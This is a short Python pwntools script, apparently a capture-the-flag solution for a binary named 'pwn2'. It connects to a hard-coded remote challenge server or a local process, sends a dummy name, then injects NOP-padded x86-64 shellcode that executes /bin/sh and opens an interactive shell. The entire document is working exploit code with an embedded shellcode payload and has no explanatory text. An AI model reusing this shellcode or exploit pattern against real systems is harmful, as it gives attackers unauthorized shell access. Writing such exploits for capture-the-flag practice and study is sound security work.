from pwn import *
import sys

try:
    if sys.argv[1] == "remote":
        r = remote("139.180.137.100", 1338)
    else:
        r = process('./pwn2')
except:
    print("Usage: python3 pwn-sol.py [remote/local]")
    exit()

context.arch = 'amd64'
shell= b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shell =  shell + b"\x90" * (39-len(shell))

log.info("Shellcode length: " + str(len(shell)))

r.recvuntil(b'name: ')
r.sendline(b"This is test name")
r.recv(1024)

r.sendline(shell)

r.interactive()